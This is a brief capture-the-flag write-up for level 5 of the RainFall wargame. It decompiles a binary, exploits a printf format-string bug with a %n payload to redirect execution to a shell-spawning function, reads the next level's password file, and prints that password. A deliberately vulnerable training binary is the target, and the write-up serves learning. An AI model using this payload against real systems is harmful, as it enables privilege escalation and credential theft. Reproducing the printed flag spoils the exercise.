# Level5

Lets decompile the binary

```jsx
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

// ------------------------ Structures ------------------------

struct _IO_FILE {
    int32_t e0;
};

// ------------------- Function Prototypes --------------------

int32_t n(void);

// --------------------- Global Variables ---------------------

struct _IO_FILE * g1 = NULL; // 0x8049848
int32_t g2;

// ------------------------ Functions -------------------------

// Address range: 0x80484c2 - 0x8048504
// Demangled:     __int128
int32_t n(void) {
    // 0x80484c2
    int32_t str; // bp-524, 0x80484c2
    fgets((char *)&str, 512, g1);
    printf((char *)&str);
    exit(1);
    return &g2;
}

// Address range: 0x8048504 - 0x8048511
int main(int argc, char ** argv) {
    // 0x8048504
    n();
    // UNREACHABLE
}

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: gcc (4.6.3)
// Detected functions: 2

```

We can already see that we have a puts followed by a printf with no flags. So we can guess that we can leak stack information using something like `%x %x %x %x` resulting in something like :

`200 b7fd1ac0 b7ff37d0 25207825`

Hmm those look like addresses

`AAAA.%x.%x.%x.%x
AAAA.200.b7fd1ac0.b7ff37d0.41414141`

Doing this confirms that the input is stored at the 4th postition in the stack. (41414141 is AAAA etc.)

There is a function name o() that seems to executes a shell. When using gdb and jumping to that function it seems to execute the shell but we dont have the necessary rights. Doing `whoami` gives us level5

`(python -c 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"'; cat) | ./level5`
`cd .. && cat ./level6/.pass`
`d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`

Ok i guess it was the same as level4

```jsx
level5@RainFall:~$ objdump -t level5 | grep " o$"
080484a4 g     F .text  0000001e              o
```

`%134513824x` prints padding to get to our desired value (0x080484a4 - 4 bytes)
